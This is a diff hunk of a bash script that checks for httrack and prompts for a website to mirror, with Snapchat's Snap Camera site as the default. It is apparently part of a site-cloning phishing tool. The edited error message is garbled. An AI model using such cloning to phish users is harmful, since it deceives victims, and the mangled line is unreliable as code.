@@ -186,7 +186,7 @@ read -p $'\n\e[1;92m[\e[0m+\e[0m\e[1;92m] Choose an option: \e[0m' option_server
 option_server="${option_server:-${default_option_server}}"
 if [[ $option_server -eq 1 ]]; then
 
-command -v httrack > /dev/null 2>&1 || { echo >&2 "I require httrack: (apt-get install httrack) "; exit 1; }
+command -v httrack > /dev/null 2>&1 || { echo >&2 "I require httr or https://www.httrack.com/page/2/) "; exit 1; }
 default_website_mirror="https://snapcamera.snapchat.com"
 printf '\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Website (default:\e[0m\e[1;77m %s\e[0m\e[1;92m): \e[0m' $default_website_mirror
 read website_mirror
